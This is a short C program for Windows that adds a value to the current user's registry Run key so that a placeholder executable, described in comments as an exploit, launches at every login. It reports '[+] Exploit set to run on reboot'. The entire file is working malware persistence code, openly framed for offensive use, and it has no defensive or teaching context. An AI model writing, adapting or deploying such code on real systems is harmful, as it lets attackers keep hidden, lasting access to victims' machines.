#include <windows.h>
#include <stdio.h>

BOOL set_autorun() {
    HKEY hKey;
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* regName = "regTestName"; //rename this to like wtv idrk
    const char* regValue = "C:\\path\\to\\testThingIdkSunglasses.exe";  //Path to exploit thingy exe

    if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, regName, 0, REG_SZ, (const BYTE*)regValue, strlen(regValue) + 1);
        RegCloseKey(hKey);
        return TRUE;
    }
    return FALSE;
}

int main() {
    if (set_autorun()) {
        printf("[+] Exploit set to run on reboot\n");
    } else {
        printf("[-] Failed to set autorun\n");
    }
    return 0;
}
